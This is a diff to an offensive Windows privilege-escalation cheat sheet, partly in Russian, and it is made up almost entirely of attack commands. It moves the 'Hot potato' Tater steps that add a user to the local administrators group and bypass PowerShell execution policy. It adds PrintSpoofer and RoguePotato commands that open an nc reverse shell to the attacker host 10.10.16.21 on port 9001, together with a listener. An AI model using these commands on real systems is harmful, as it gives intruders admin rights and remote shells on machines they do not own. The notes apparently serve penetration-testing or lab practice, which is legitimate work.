@@ -242,6 +242,27 @@ C:\PrivEsc\RoguePotato.exe -r 10.10.10.10 -e "C:\PrivEsc\reverse.exe" -l 9999
 
     .\jp.exe -t * -p c:\programdata\cmd.bat
 
+#  Hot potato
+
+    Exploitation
+
+    Windows VM
+
+    1. In command prompt type: powershell.exe -nop -ep bypass
+    2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
+    3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
+    4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
+
+#  PrintSpoofer (JuicyPotato не работает на Windows Server 2019 и Windows 10, начиная со сборки 1809)
+    
+    https://github.com/itm4n/PrintSpoofer
+    xp_cmdshell c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe 10.10.16.21 9001 -e cmd"
+    nc -lnvp 9001
+
+# RoguePotato
+    https://github.com/antonioCoco/RoguePotato
+    RoguePotato.exe -r 10.10.16.21 -e "c:\tools\nc.exe 10.10.16.21 9001 -e cmd" -l 9999
+    
 # SeBackupPrivilege
 
 1        делаем файл diskshadow.txt
@@ -571,17 +592,7 @@ Add-ObjectACL -PrincipalIdentity max -Credential $cred -Rights DCSync
 
 
 
-# Hot potato
 
-
-Exploitation
-
-Windows VM
-
-1. In command prompt type: powershell.exe -nop -ep bypass
-2. In Power Shell prompt type: Import-Module C:\Users\User\Desktop\Tools\Tater\Tater.ps1
-3. In Power Shell prompt type: Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
-4. To confirm that the attack was successful, in Power Shell prompt type: net localgroup administrators
 
 # LAPS (взлом)
 
